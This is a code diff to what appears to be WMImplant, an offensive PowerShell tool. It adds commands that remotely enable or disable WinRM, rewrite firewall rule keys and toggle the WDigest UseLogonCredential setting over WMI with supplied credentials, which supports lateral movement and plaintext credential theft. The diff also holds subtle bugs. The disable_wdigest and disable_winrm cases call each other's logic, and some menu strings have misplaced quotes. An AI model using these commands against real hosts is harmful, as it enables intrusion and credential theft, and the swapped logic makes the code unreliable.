@@ -6,6 +6,64 @@
     Author: @ChrisTruncer and @evan_pena2003
 #>
 
+function Disable-WinRMWMI
+{
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [System.Management.Automation.PSCredential]$Creds,
+        [Parameter(Mandatory = $False)]
+        [string]$Target
+    )
+
+    Begin
+    {
+        $HKLM = 2147483650
+        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
+        $DWORDName = 'AllowAutoConfig' 
+        $DWORDvalue = '0x1'
+    }
+
+    Process
+    {
+        if(!$Target)
+        {
+            $Target = Read-Host "What system are you targeting? >"
+            $Target = $Target.Trim()
+        }
+
+        Write-Verbose 'Attempting to create Remote Key and set value'
+        if($Creds)
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
+        }
+        else 
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
+        }
+
+        Write-Verbose 'Attempting to stop WinRM'
+        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StopService() | Out-Null
+        Start-Sleep -Seconds 10
+
+        # Variables for WinRM Firewall Rule
+        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
+        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
+        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
+        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
+        $Rule2Name = 'WINRM-HTTP-In-TCP'
+
+        if($Creds)
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
+        }
+        else 
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
+        }        
+    }
+}
+
 function Enable-WinRMWMI
 {
     param
@@ -18,12 +76,10 @@ function Enable-WinRMWMI
 
     Begin
     {
-        Write-Debug 'Opening Begin block'
         $HKLM = 2147483650
         $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
         $DWORDName = 'AllowAutoConfig' 
         $DWORDvalue = '0x1'
-        Write-Debug 'Finished begin block variables are built'
     }
 
     Process
@@ -37,20 +93,17 @@ function Enable-WinRMWMI
         # This code was found online as separate functions and combined into a single
         # function where appropriate
         # Enabling WinRM Service
-        Write-Verbose 'Attempting to create Remote Key'
+        Write-Verbose 'Attempting to create Remote Key and set value'
         if($Creds)
         {
+            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
             Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target -Creds $Creds
         }
         else 
         {
+            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
             Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target
         }
-        
-        if (($reg.CreateKey($HKLM, $key)).returnvalue -ne 0) {Throw 'Failed to create key'}
-
-        Write-Verbose 'Attemping to set DWORD value'
-        if (($reg.SetDWORDValue($HKLM, $Key, $DWORDName, $DWORDvalue)).ReturnValue -ne 0) {Throw 'Failed to set DWORD'}
 
         Write-Verbose 'Attempting to start WinRM'
         (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StartService() | Out-Null
@@ -63,9 +116,18 @@ function Enable-WinRMWMI
         $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
         $Rule2Name = 'WINRM-HTTP-In-TCP'
 
-        if (($reg.CreateKey($HKLM, $key)).returnvalue -ne 0) {Throw 'Failed to create key'}
-        if (($reg.SetStringValue($HKLM, $Key, $Rule1Name, $Rule1Value)).ReturnValue -ne 0) {Throw 'Failed to set REG_SZ'}
-        if (($reg.SetStringValue($HKLM, $Key, $Rule2Name, $Rule2Value)).ReturnValue -ne 0) {Throw 'Failed to set REG_SZ'}
+        if($Creds)
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
+            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target -Creds $Creds
+            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target -Creds $Creds
+        }
+        else 
+        {
+            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
+            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target
+            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target
+        }
 
         # Restarting firewall service
         Write-Verbose 'Attempting to stop MpsSvc'
@@ -756,6 +818,20 @@ function Invoke-CommandGeneration
             }
         }
 
+        "disable_winrm"
+        {
+            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget`n"
+                $Command
+            }
+        }
+
         "enable_wdigest"
         {
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
@@ -766,6 +842,20 @@ function Invoke-CommandGeneration
             else
             {
                 $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget`n"
+                $Command
+            }
+        }
+
+        "enable_winrm"
+        {
+            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget`n"
                 $Command
             }
         }
@@ -2349,6 +2439,90 @@ function Invoke-WMImplant
                     }
                 }
 
+                "disable_wdigest"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Disable-WinRMWMI -Creds $Credential -Target $Computer
+                        }
+
+                        else
+                        {
+                            Disable-WinRMWMI -Target $Computer
+                        }
+                    }
+                }
+
+                "disable_winrm"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-RegValueMod -Creds $RemoteCredential -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
+                        }
+
+                        else
+                        {
+                            Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
+                        }
+                    }
+                }
+
+                "enable_wdigest"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-RegValueMod -Creds $RemoteCredential -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
+                        }
+
+                        else
+                        {
+                            Invoke-RegValueMod -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
+                        }
+                    }
+                }
+
+                "enable_winrm"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Enable-WinRMWMI -Creds $Credential -Target $Computer
+                        }
+
+                        else
+                        {
+                            Enable-WinRMWMI -Target $Computer
+                        }
+                    }
+                }
+
                 "registry_mod"
                 {
                     if(!$Target)
@@ -2990,7 +3164,9 @@ function Show-WMImplantMainMenu
     $menu_options += "====================================================================`n"
     $menu_options += "command_exec - Run a command line command and get the output`n"
     $menu_options += "disable_wdigest - Remove registry key UseLogonCredential`n"
+    $menu_options += "disable_winrm - Disable WinRM on the targeted host"`n
     $menu_options += "enable_wdigest - Add registry key UseLogonCredential`n"
+    $menu_options += "enable_winrm - Enable WinRM on a targeted host"`n
     $menu_options += "registry_mod - Modify the registry on the targeted system`n"
     $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
     $menu_options += "sched_job - Manipulate scheduled jobs`n"
@@ -3163,12 +3339,25 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -RegMethod delete -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue 'UseLogonCredential'
+                    Invoke-RegValueMod -Creds $Credential -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
                 }
 
                 else
                 {
-                    Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue 'UseLogonCredential'
+                    Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
+                }
+            }
+
+            "disable_winrm"
+            {
+                if ($Credential)
+                {
+                    Disable-WinRMWMI -Creds $Credential
+                }
+
+                else
+                {
+                    Disable-WinRMWMI
                 }
             }
 
@@ -3181,7 +3370,20 @@ function Use-MenuSelection
 
                 else
                 {
-                    Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue UseLogonCredential -RegData "0x1"
+                    Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue UseLogonCredential -RegData "0x1"
+                }
+            }
+
+            "enable_winrm"
+            {
+                if ($Credential)
+                {
+                    Enable-WinRMWMI -Creds $Credential
+                }
+
+                else
+                {
+                    Enable-WinRMWMI
                 }
             }
 
